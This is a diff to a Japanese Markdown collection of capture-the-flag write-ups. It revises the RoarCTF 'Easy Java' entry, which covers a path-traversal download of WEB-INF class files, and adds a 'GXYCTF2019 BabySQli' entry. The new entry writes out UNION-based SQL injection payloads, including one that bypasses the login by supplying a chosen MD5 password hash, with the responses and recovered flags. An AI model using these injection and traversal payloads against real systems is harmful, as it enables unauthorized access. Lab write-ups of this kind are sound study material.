@@ -31,6 +31,7 @@
 - [[BJDCTF 2nd]fake google](#bjdctf-2ndfake-google)
 - [[极客大挑战 2019]HardSQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019hardsql)
 - [[RoarCTF 2019]Easy Java](#roarctf-2019easy-java)
+- [[GXYCTF2019]BabySQli](#gxyctf2019babysqli)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -1754,14 +1755,18 @@ flag{462203de-c0ad-4223-ac27-0fbffe2dd2e4}
 
 # [RoarCTF 2019]Easy Java
 
-名前からして
+とりあえずリクエストヘッダを確認すると
+```
 Cookie: JSESSIONID=3CD6A9F87E6506E0E672B56ED1E551F5
-がJavaで生成される特有のセッションIDっぽい気もする
+```
+がJavaで生成される特有のセッションIDっぽい
 
 
 > JSESSIONIDのCookieは、セッションの作成時に作成または送信されます。セッションは、初めてコード request.getSession() または request.getSession(true) を呼び出すと作成されます。
 
-あとあるとしたらSQLインジェクション??って感じ
+SQLインジェクションの脆弱性も特になさそう
+
+Helpのリンクに飛んでみると
 
 ```
 /Download?filename=help.docx
@@ -1897,3 +1902,112 @@ POST /Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class
  % echo -n 'ZmxhZ3s1MWM1ZjA1ZS1hNjc5LTQ2ZDktOTU2Mi1hODE2NDc2NWQxNTZ9Cg==^L' | base64 -d
 flag{51c5f05e-a679-46d9-9562-a8164765d156}
 ```
+
+# [GXYCTF2019]BabySQli
+
+どんなリクエストでもレスポンスのソースにコメントが書かれており
+```
+<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
+```
+と書かれている。
+
+適当なsqliを試してみると
+```
+admin'or1=1#
+```
+```
+do not hack me!
+```
+と出る
+
+```
+MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5
+```
+がハッシュなのかなと思ったが96文字ってことは48バイトのハッシュってなんかあったっけ
+ハッシュではなさそう
+base64でもない??
+と思ったらbase64でエンコードされたあとにbase32でエンコードされてるっぽい。
+CyberChefかなんかで適当にデコードしてみると
+```
+select * from user where username = '$name'
+```
+とでる。とりあえずSQLiは使えそうです。
+
+```
+admin' union select 1#
+```
+
+```
+Error: The used SELECT statements have a different number of columns
+```
+
+```
+admin' union select 1,2,3#
+```
+にするとエラーがでなくなるのでカラムは3つあると推測できる
+
+```
+admin' union select 1,2,group_concat(table_name) from information_schema.columns#
+```
+do not hack me!といわれる。
+
+orとか=がフィルタリングされているっぽい。
+あと information_schema.columnsもダメっぽい。
+
+```
+admin' union select 1,2,group_concat(username) from user#
+```
+
+()もダメ。
+
+```
+admin' union select 1,2,username from user#
+```
+
+```
+admin' union select 1,2,password from user where username like binary 'admin
+```
+
+passwordもダメ
+
+ここらへんは次からburpかなにかを使って自動でチェックする
+
+```
+admin' union select 1,2,3#
+```
+だとwrong userだけど
+```
+admin' union select 1,'admin',3#
+```
+にすると、wrong passになる。
+
+```
+0' union select 1,'admin',3#
+```
+3の位置にpasswordのハッシュ値をいれてpasswordのフォームにハッシュ化される前のpasswordをいれると通る….
+
+```
+┌──(kali㉿kali)-[~]
+└─$ echo -n '1234' | md5sum
+81dc9bdb52d04dc20036dbd8313ed055  -
+```                     
+
+```
+0' union select 1,'admin','81dc9bdb52d04dc20036dbd8313ed055'#
+1234
+```
+
+flag{bcb6b5b1-e9e2-44a7-88c5-ad71d18182e1}
+
+ここで単純にSQLiがあるかどうか、カラムの数がいくつなのかを確かめるだけのものだと思っていた
+```
+' union select 1,2,3#
+```
+ってそういえばなにしてんだという気持ちになった。
+おそらくunionをつけるまえのselectがfromしているテーブルが呼ばれている気がする。
+少しずつ挙動を確かめていくタイプのSQLiはむずかしいですね...。
+
+```
+admin’ union select 1,'admin',3#
+```
+だと通らないのもいまいちよくわかってない。
